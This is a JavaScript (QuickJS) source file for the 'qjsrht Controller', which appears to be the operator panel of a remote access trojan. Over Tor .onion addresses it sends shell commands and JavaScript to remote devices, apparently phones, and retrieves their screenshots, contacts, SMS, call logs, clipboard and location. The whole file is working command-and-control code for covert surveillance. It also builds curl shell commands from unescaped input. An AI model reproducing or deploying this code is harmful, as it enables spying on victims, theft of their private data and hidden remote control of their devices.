import * as std from 'std';
import * as os from 'os';
import sockets from './qjsnet.so';

/* setInterval polyfill */
const intervals = new Map();
let nextId = 1;

globalThis.setInterval = (callback, delay, ...args) => {
  const id = nextId++;
  const tick = () => {
    if (!intervals.has(id)) return;
    try {
      callback(...args);
    } catch (err) {
      std.err.puts(String(err) + '\n');
    }
    if (intervals.has(id)) {
      const handle = os.setTimeout(tick, delay);
      intervals.set(id, handle);
    }
  };
  const handle = os.setTimeout(tick, delay);
  intervals.set(id, handle);
  return id;
};

globalThis.clearInterval = (id) => {
  if (intervals.has(id)) {
    os.clearTimeout(intervals.get(id));
    intervals.delete(id);
  }
};

// ---------- Configuration ----------
const SERVERS_FILE = 'servers.json';
const TOR_SOCKS = '127.0.0.1:9050';
let servers = [];

// ---------- Helper: run curl with Tor SOCKS ----------
function curlRequest(url, method = 'GET', headers = {}, body = null, useTor = true) {
    const tmpOut = os.tmpname();
    const tmpErr = os.tmpname();
    let cmd = `curl -s -w "\n%{http_code}" -X ${method} `;
    if (useTor && url.includes('.onion')) {
        cmd += `--socks5-hostname ${TOR_SOCKS} `;
    }
    for (let [k, v] of Object.entries(headers)) {
        cmd += `-H "${k}: ${v}" `;
    }
    if (body) {
        const tmpBody = os.tmpname();
        std.fs.writeFile(tmpBody, JSON.stringify(body));
        cmd += `-d @${tmpBody} `;
    }
    cmd += `"${url}" > ${tmpOut} 2> ${tmpErr}`;
    std.system(cmd);
    const output = std.fs.readFile(tmpOut);
    const err = std.fs.readFile(tmpErr);
    std.fs.remove(tmpOut);
    std.fs.remove(tmpErr);
    if (body) std.fs.remove(tmpBody);
    const lines = output.trim().split('\n');
    const status = parseInt(lines.pop());
    const responseBody = lines.join('\n');
    return { status, body: responseBody, error: err };
}

// ---------- Tor management ----------
function ensureTor() {
    // Test if Tor SOCKS port is open
    const sock = sockets.socket(sockets.AF_INET, sockets.SOCK_STREAM, 0);
    sockets.setnonblocking(sock);
    const connected = sockets.connect(sock, '127.0.0.1', 9050);
    if (connected === 0) {
        sockets.close(sock);
        return true;
    }
    sockets.close(sock);
    std.out.puts('Tor not running. Attempting to start...\n');
    // Try to start Tor in background (assumes 'tor' is in PATH)
    std.system('tor --quiet &');
    // Wait a bit
    os.sleep(2000);
    // Check again
    const sock2 = sockets.socket(sockets.AF_INET, sockets.SOCK_STREAM, 0);
    const ok = sockets.connect(sock2, '127.0.0.1', 9050) === 0;
    sockets.close(sock2);
    if (!ok) {
        std.err.puts('ERROR: Could not start Tor. Please start it manually.\n');
    }
    return ok;
}

// ---------- Server management ----------
function loadServers() {
    try {
        const data = std.fs.readFile(SERVERS_FILE);
        servers = JSON.parse(data);
    } catch (e) {
        servers = [];
    }
}
function saveServers() {
    std.fs.writeFile(SERVERS_FILE, JSON.stringify(servers, null, 2));
}

function checkServerHealth(server) {
    const url = `http://${server.onion}:${server.port}/health`;
    const auth = 'Bearer ' + server.token;
    const res = curlRequest(url, 'GET', { Authorization: auth }, null, true);
    const online = res.status === 200;
    server.online = online;
    if (online && !server.ip) {
        // Fetch public IP via ipapi.co (no Tor)
        const ipRes = curlRequest('https://ipapi.co/json/', 'GET', {}, null, false);
        if (ipRes.status === 200) {
            try {
                const data = JSON.parse(ipRes.body);
                server.ip = data.ip;
                server.country = data.country_name;
                server.flag = data.country_code?.toLowerCase();
            } catch (e) {}
        }
    }
    return online;
}

// ---------- HTTP server with epoll ----------
function handleRequest(clientFd, requestData, client) {
    // requestData may contain multiple requests? We'll parse as we do in express.js
    // But for simplicity, we'll assume one request per read, but we need to handle pipelining.
    // We'll implement a simple buffer per client.

    // Parse the request (first line and headers)
    const headerEnd = requestData.indexOf('\r\n\r\n');
    if (headerEnd === -1) {
        // Incomplete headers, keep buffering
        client.buffer += requestData;
        return;
    }

    const headerPart = requestData.substring(0, headerEnd + 4);
    const parsed = sockets.parse_http_request(headerPart);
    if (!parsed) {
        // Bad request
        const response = 'HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n';
        sockets.send(clientFd, response, 0);
        sockets.close(clientFd);
        return;
    }

    // Determine body length
    const contentLength = parseInt(parsed.headers['content-length'] || '0');
    const bodyStart = headerEnd + 4;
    const totalNeeded = headerEnd + 4 + contentLength;
    if (requestData.length < totalNeeded) {
        // Incomplete body, keep buffering
        client.buffer += requestData;
        return;
    }

    const body = requestData.substring(bodyStart, bodyStart + contentLength);
    parsed.body = body;

    // Handle the request
    const response = generateResponse(parsed);
    sockets.send(clientFd, response, 0);

    // Check if connection should be kept alive
    const connection = (parsed.headers['connection'] || '').toLowerCase();
    const keepAlive = connection === 'keep-alive';
    if (keepAlive) {
        // Reset buffer for next request
        const remaining = requestData.substring(totalNeeded);
        client.buffer = remaining;
        client.lastActivity = Date.now();
        // Continue listening for more data on this socket
    } else {
        sockets.close(clientFd);
    }
}

function generateResponse(req) {
    const path = req.path;
    const method = req.method;
    let body = {};
    if (req.body) {
        try { body = JSON.parse(req.body); } catch (e) {}
    }
    let responseData = {};
    let status = 200;

    if (path === '/' && method === 'GET') {
        const html = getIndexHTML();
        return `HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: ${html.length}\r\n\r\n${html}`;
    }

    if (path.startsWith('/api/')) {
        if (path === '/api/servers' && method === 'GET') {
            responseData = servers.map(s => ({
                id: s.id, alias: s.alias, onion: s.onion, port: s.port,
                online: s.online, ip: s.ip, country: s.country, flag: s.flag
            }));
        }
        else if (path === '/api/servers' && method === 'POST') {
            const newServer = {
                id: Date.now().toString(),
                alias: body.alias,
                onion: body.onion,
                port: body.port,
                token: body.token,
                online: false
            };
            servers.push(newServer);
            saveServers();
            checkServerHealth(newServer); // async
            responseData = { success: true, id: newServer.id };
        }
        else if (path.match(/^\/api\/servers\/[^\/]+$/) && method === 'DELETE') {
            const id = path.split('/')[3];
            servers = servers.filter(s => s.id !== id);
            saveServers();
            responseData = { success: true };
        }
        else if (path === '/api/exec' && method === 'POST') {
            const server = servers.find(s => s.id === body.serverId);
            if (!server) { status = 404; responseData = { error: 'Server not found' }; }
            else {
                const url = `http://${server.onion}:${server.port}/exec`;
                const auth = 'Bearer ' + server.token;
                const res = curlRequest(url, 'POST', { Authorization: auth, 'Content-Type': 'application/json' }, { cmd: body.cmd }, true);
                try { responseData = JSON.parse(res.body || '{}'); } catch (e) { responseData = { raw: res.body }; }
                responseData._httpStatus = res.status;
            }
        }
        else if (path === '/api/native' && method === 'POST') {
            const server = servers.find(s => s.id === body.serverId);
            if (!server) { status = 404; responseData = { error: 'Server not found' }; }
            else {
                const url = `http://${server.onion}:${server.port}/api/native`;
                const auth = 'Bearer ' + server.token;
                const res = curlRequest(url, 'POST', { Authorization: auth, 'Content-Type': 'application/json' }, { action: body.action, params: body.params }, true);
                try { responseData = JSON.parse(res.body || '{}'); } catch (e) { responseData = { raw: res.body }; }
            }
        }
        else if (path === '/api/js' && method === 'POST') {
            const server = servers.find(s => s.id === body.serverId);
            if (!server) { status = 404; responseData = { error: 'Server not found' }; }
            else {
                const url = `http://${server.onion}:${server.port}/api/js`;
                const auth = 'Bearer ' + server.token;
                const res = curlRequest(url, 'POST', { Authorization: auth, 'Content-Type': 'application/json' }, { code: body.code }, true);
                try { responseData = JSON.parse(res.body || '{}'); } catch (e) { responseData = { raw: res.body }; }
            }
        }
        else {
            status = 404;
            responseData = { error: 'Not found' };
        }
        const json = JSON.stringify(responseData);
        return `HTTP/1.1 ${status} OK\r\nContent-Type: application/json\r\nContent-Length: ${json.length}\r\n\r\n${json}`;
    }

    // 404
    return 'HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n';
}

function startClientServer() {
    const serverFd = sockets.socket(sockets.AF_INET, sockets.SOCK_STREAM, 0);
    sockets.setsockopt(serverFd, sockets.SOL_SOCKET, sockets.SO_REUSEADDR, 1);
    sockets.bind(serverFd, '0.0.0.0', 9000);
    sockets.listen(serverFd, 128);
    sockets.setnonblocking(serverFd);

    const epfd = sockets.epoll_create1(0);
    sockets.epoll_ctl(epfd, sockets.EPOLL_CTL_ADD, serverFd, sockets.EPOLLIN | sockets.EPOLLRDHUP);

    const clients = new Map();
    const keepAliveTimeout = 5000;

    std.out.puts('Client UI running at http://localhost:9000\n');

    while (true) {
        const events = sockets.epoll_wait(epfd, 256, 100);

        // Clean up timed-out connections
        const now = Date.now();
        for (const [fd, client] of clients.entries()) {
            if (now - client.lastActivity > keepAliveTimeout) {
                sockets.epoll_ctl(epfd, sockets.EPOLL_CTL_DEL, fd, 0);
                sockets.close(fd);
                clients.delete(fd);
            }
        }

        for (const event of events) {
            if (event.fd === serverFd) {
                // New connection
                try {
                    const clientInfo = sockets.accept(serverFd);
                    if (clientInfo) {
                        const clientFd = clientInfo.fd;
                        sockets.setnonblocking(clientFd);
                        sockets.epoll_ctl(epfd, sockets.EPOLL_CTL_ADD, clientFd,
                            sockets.EPOLLIN | sockets.EPOLLRDHUP);
                        clients.set(clientFd, {
                            buffer: '',
                            lastActivity: Date.now()
                        });
                    }
                } catch (e) {}
            } else {
                // Client event
                const clientFd = event.fd;
                const client = clients.get(clientFd);
                if (!client) continue;

                if (event.events & sockets.EPOLLRDHUP || event.events & sockets.EPOLLHUP) {
                    sockets.epoll_ctl(epfd, sockets.EPOLL_CTL_DEL, clientFd, 0);
                    sockets.close(clientFd);
                    clients.delete(clientFd);
                    continue;
                }

                if (event.events & sockets.EPOLLIN) {
                    try {
                        const data = sockets.recv(clientFd, 8192, 0);
                        if (!data || data.length === 0) {
                            sockets.epoll_ctl(epfd, sockets.EPOLL_CTL_DEL, clientFd, 0);
                            sockets.close(clientFd);
                            clients.delete(clientFd);
                            continue;
                        }

                        client.buffer += data;
                        client.lastActivity = Date.now();

                        // Process as many complete requests as possible
                        while (true) {
                            const headerEnd = client.buffer.indexOf('\r\n\r\n');
                            if (headerEnd === -1) break;

                            const headerPart = client.buffer.substring(0, headerEnd + 4);
                            const parsed = sockets.parse_http_request(headerPart);
                            if (!parsed) {
                                // Bad request, close connection
                                sockets.send(clientFd, 'HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n', 0);
                                sockets.epoll_ctl(epfd, sockets.EPOLL_CTL_DEL, clientFd, 0);
                                sockets.close(clientFd);
                                clients.delete(clientFd);
                                break;
                            }

                            const contentLength = parseInt(parsed.headers['content-length'] || '0');
                            const bodyStart = headerEnd + 4;
                            const totalNeeded = bodyStart + contentLength;

                            if (client.buffer.length < totalNeeded) break;

                            parsed.body = client.buffer.substring(bodyStart, totalNeeded);

                            const response = generateResponse(parsed);
                            sockets.send(clientFd, response, 0);

                            // Remove processed part
                            client.buffer = client.buffer.substring(totalNeeded);

                            // Check if connection should be kept alive
                            const connection = (parsed.headers['connection'] || '').toLowerCase();
                            if (connection !== 'keep-alive') {
                                sockets.epoll_ctl(epfd, sockets.EPOLL_CTL_DEL, clientFd, 0);
                                sockets.close(clientFd);
                                clients.delete(clientFd);
                                break;
                            }
                        }
                    } catch (e) {
                        // Error on recv, close connection
                        sockets.epoll_ctl(epfd, sockets.EPOLL_CTL_DEL, clientFd, 0);
                        sockets.close(clientFd);
                        clients.delete(clientFd);
                    }
                }
            }
        }
    }
}

// ---------- Main ----------
if (!ensureTor()) {
    std.err.puts('WARNING: Tor is not available. .onion connections will fail.\n');
}
loadServers();
// Health check every 30 seconds
setInterval(() => {
    servers.forEach(s => checkServerHealth(s));
}, 30000);
startClientServer();

// ---------- Embedded HTML with full UI ----------
function getIndexHTML() {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>qjsrht Client</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        h1, h2 { color: #333; }
        #server-list { display: flex; flex-wrap: wrap; gap: 15px; margin-bottom: 20px; }
        .server-card {
            background: white; border: 1px solid #ddd; border-radius: 8px; padding: 15px;
            width: 250px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .server-card .online { color: green; font-weight: bold; }
        .server-card .offline { color: red; font-weight: bold; }
        .server-card .flag { font-size: 24px; margin-right: 5px; }
        .server-card button { margin-top: 10px; margin-right: 5px; }
        #command-panel { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        select, input, textarea, button { margin: 5px; padding: 8px; font-size: 14px; }
        .terminal {
            background: #1e1e1e; color: #0f0; font-family: 'Courier New', monospace;
            padding: 10px; border-radius: 4px; height: 200px; overflow: auto;
            white-space: pre-wrap; word-wrap: break-word;
        }
        .button-group { margin: 10px 0; }
        .button-group button { background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .button-group button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <h1>qjsrht Controller</h1>
    <div>
        <h2>Servers <button onclick="addServer()">+ Add Server</button></h2>
        <div id="server-list"></div>
    </div>
    <div id="command-panel">
        <h2>Commands</h2>
        <div>
            <label>Select Server:</label>
            <select id="server-select"></select>
        </div>
        <div class="button-group">
            <button onclick="sendNative('screenshot')">Screenshot</button>
            <button onclick="sendNative('contacts')">Contacts</button>
            <button onclick="sendNative('clipboard')">Clipboard</button>
            <button onclick="sendNative('location')">Location</button>
            <button onclick="sendNative('sms')">SMS</button>
            <button onclick="sendNative('callLog')">Call Log</button>
            <button onclick="sendNative('apps')">Installed Apps</button>
            <button onclick="sendNative('settings', {key:'wifi_on', value:true})">WiFi On</button>
            <button onclick="sendNative('settings', {key:'wifi_on', value:false})">WiFi Off</button>
        </div>
        <h3>Shell Terminal</h3>
        <input id="shell-cmd" type="text" placeholder="Enter command" style="width: 400px;">
        <button onclick="runShell()">Run</button>
        <pre id="shell-output" class="terminal"></pre>
        <h3>JavaScript Terminal (remote qjs)</h3>
        <textarea id="js-code" rows="4" cols="70" placeholder="JavaScript code"></textarea>
        <button onclick="runJS()">Run</button>
        <pre id="js-output" class="terminal"></pre>
    </div>

    <script>
        let servers = [];

        async function fetchServers() {
            const res = await fetch('/api/servers');
            servers = await res.json();
            renderServers();
            updateServerSelect();
        }

        function renderServers() {
            const container = document.getElementById('server-list');
            container.innerHTML = servers.map(s => \`
                <div class="server-card" data-id="\${s.id}">
                    <div>
                        <span class="flag">\${s.flag ? '🇺🇳' : ''}</span>
                        <strong>\${s.alias}</strong>
                    </div>
                    <div>Onion: \${s.onion}:\${s.port}</div>
                    <div>Status: <span class="\${s.online ? 'online' : 'offline'}">\${s.online ? 'ONLINE' : 'OFFLINE'}</span></div>
                    <div>IP: \${s.ip || 'unknown'}</div>
                    <div>Country: \${s.country || 'unknown'}</div>
                    <button onclick="editServer('\${s.id}')">Edit</button>
                    <button onclick="deleteServer('\${s.id}')">Delete</button>
                </div>
            \`).join('');
        }

        function updateServerSelect() {
            const select = document.getElementById('server-select');
            select.innerHTML = servers.map(s => \`<option value="\${s.id}">\${s.alias} (\${s.onion})\</option>\`).join('');
        }

        async function addServer() {
            const alias = prompt('Enter alias:');
            if (!alias) return;
            const onion = prompt('Enter .onion address:');
            if (!onion) return;
            const port = prompt('Enter port:');
            if (!port) return;
            const token = prompt('Enter auth token:');
            if (!token) return;
            const res = await fetch('/api/servers', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ alias, onion, port, token })
            });
            if (res.ok) fetchServers();
        }

        async function deleteServer(id) {
            if (!confirm('Delete server?')) return;
            const res = await fetch('/api/servers/' + id, { method: 'DELETE' });
            if (res.ok) fetchServers();
        }

        function editServer(id) {
            alert('Edit not implemented yet');
        }

        async function sendNative(action, params = {}) {
            const select = document.getElementById('server-select');
            const serverId = select.value;
            if (!serverId) { alert('Select a server'); return; }
            const res = await fetch('/api/native', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ serverId, action, params })
            });
            const data = await res.json();
            alert(JSON.stringify(data, null, 2));
        }

        async function runShell() {
            const cmd = document.getElementById('shell-cmd').value;
            if (!cmd) return;
            const select = document.getElementById('server-select');
            const serverId = select.value;
            if (!serverId) { alert('Select a server'); return; }
            const res = await fetch('/api/exec', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ serverId, cmd })
            });
            const data = await res.json();
            document.getElementById('shell-output').textContent = data.output || data.error || 'No output';
        }

        async function runJS() {
            const code = document.getElementById('js-code').value;
            if (!code) return;
            const select = document.getElementById('server-select');
            const serverId = select.value;
            if (!serverId) { alert('Select a server'); return; }
            const res = await fetch('/api/js', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ serverId, code })
            });
            const data = await res.json();
            document.getElementById('js-output').textContent = data.output || data.error || 'No output';
        }

        // Initial load and periodic refresh
        fetchServers();
        setInterval(fetchServers, 10000);
    </script>
</body>
</html>`;
}